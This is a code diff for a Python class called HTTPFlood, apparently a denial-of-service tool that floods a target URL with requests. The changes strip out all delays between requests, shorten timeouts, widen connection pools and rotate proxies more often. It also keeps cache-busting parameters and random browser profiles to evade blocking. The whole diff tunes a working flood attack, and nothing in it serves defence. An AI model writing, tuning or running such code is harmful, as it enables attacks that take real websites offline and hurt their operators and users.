@@ -319,8 +319,8 @@ class HTTPFlood:
         session.verify = False
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=2,
-            pool_maxsize=3,
+            pool_connections=10,
+            pool_maxsize=20,
             max_retries=0,
             pool_block=False
         )
@@ -334,18 +334,20 @@ class HTTPFlood:
         local_count = 0
         current_proxy = None
         proxy_fails = 0
+        requests_with_proxy = 0
         
         while self.running and time.time() < end_time:
             try:
-                if config.proxies and (current_proxy is None or proxy_fails >= 3):
+                if config.proxies and (current_proxy is None or proxy_fails >= 5 or requests_with_proxy >= 50):
                     current_proxy = get_proxy()
                     if current_proxy:
                         session.proxies = current_proxy
                         proxy_fails = 0
+                        requests_with_proxy = 0
                     else:
                         if config.debug:
                             print("[DEBUG] No working proxies available")
-                        time.sleep(1)
+                        time.sleep(0.5)
                         continue
                 
                 profile = random.choice(BROWSER_PROFILES)
@@ -364,7 +366,7 @@ class HTTPFlood:
                 
                 target_url = add_cache_buster(target_url)
                 
-                timeout = 15 if config.proxies else 5
+                timeout = 3 if config.proxies else 2
                 
                 if self.method == 'GET':
                     response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
@@ -383,6 +385,7 @@ class HTTPFlood:
                 
                 proxy_fails = 0
                 local_count += 1
+                requests_with_proxy += 1
                 
                 if config.debug and local_count % 10 == 0:
                     print(f"[DEBUG] Thread {threading.current_thread().name}: {local_count} requests | Status: {response.status_code}")
@@ -392,13 +395,12 @@ class HTTPFlood:
                 update_stats(success=False)
                 proxy_fails += 1
                 
-                if current_proxy and proxy_fails >= 3:
+                if current_proxy and proxy_fails >= 5:
                     mark_proxy_bad(current_proxy)
                     if config.debug:
                         print(f"[DEBUG] Marked proxy as bad: {type(e).__name__}")
                     current_proxy = None
-                
-                time.sleep(0.1)
+                    requests_with_proxy = 0
                 
             except (requests.exceptions.ConnectionError,
                     requests.exceptions.Timeout,
@@ -409,20 +411,15 @@ class HTTPFlood:
                 if config.debug:
                     print(f"[DEBUG] Connection error: {type(e).__name__}")
                 
-                if current_proxy and proxy_fails >= 5:
+                if current_proxy and proxy_fails >= 8:
                     mark_proxy_bad(current_proxy)
                     current_proxy = None
-                
-                time.sleep(0.2)
+                    requests_with_proxy = 0
                 
             except Exception as e:
                 update_stats(success=False)
                 if config.debug:
                     print(f"[DEBUG] Error: {type(e).__name__}: {str(e)[:50]}")
-                time.sleep(0.1)
-            
-            else:
-                time.sleep(0.005)
         
         try:
             session.close()
